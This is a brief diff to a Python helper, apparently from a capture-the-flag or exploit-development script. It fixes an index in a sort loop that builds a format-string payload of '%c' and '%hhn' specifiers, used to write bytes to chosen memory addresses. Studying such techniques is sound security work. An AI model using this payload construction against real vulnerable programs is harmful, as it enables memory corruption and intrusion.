@@ -23,7 +23,7 @@ def formatthingy(base, replacewith, tobereplaced):
     for i in range(len(sort)):
         for j in range(len(l)):
             if l[j] == sort[i]:
-                t[j] = i
+                t[i] = j
     x = "%{0}c%0$hhn%{1}c%0$hhn%{2}c%0$hhn%{3}c%0$hhn".format(l[t[0]], l[t[1]]-l[t[0]], l[t[2]]-l[t[1]], l[t[3]]-l[t[2]]).encode()
     x += b'a'*(4-(len(x)%4))
     offset = (len(x)//4)+base
